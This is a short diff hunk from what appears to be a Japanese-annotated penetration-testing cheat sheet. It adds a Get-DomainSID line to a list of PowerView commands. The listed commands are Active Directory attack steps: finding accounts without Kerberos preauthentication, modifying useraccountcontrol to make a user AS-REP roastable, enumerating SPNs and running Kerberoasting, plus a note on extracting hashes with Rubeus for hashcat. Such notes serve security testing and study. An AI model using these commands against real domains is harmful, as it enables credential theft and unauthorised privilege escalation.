@@ -43,6 +43,7 @@ Import-Module .\PowerView.ps1 #ターゲットのPS上でpowerviewをインポ�
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH #ASReproastingの対象となるユーザの探索
 Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose #GenericAll権限があるユーザでほかのユーザにASReproastingが効くようにする
 Get-DomainUser -SPN #SPNの列挙
+Get-DomainSID #domain sidの入手
 Invoke-Kerberoast　#kerberoastingの実行
 
 //Rubeus.exe (asreproast /format:hashcatを使用して、DONT_REQ_PREAUTHフラグを持つすべてのアカウントを列挙することもできる)
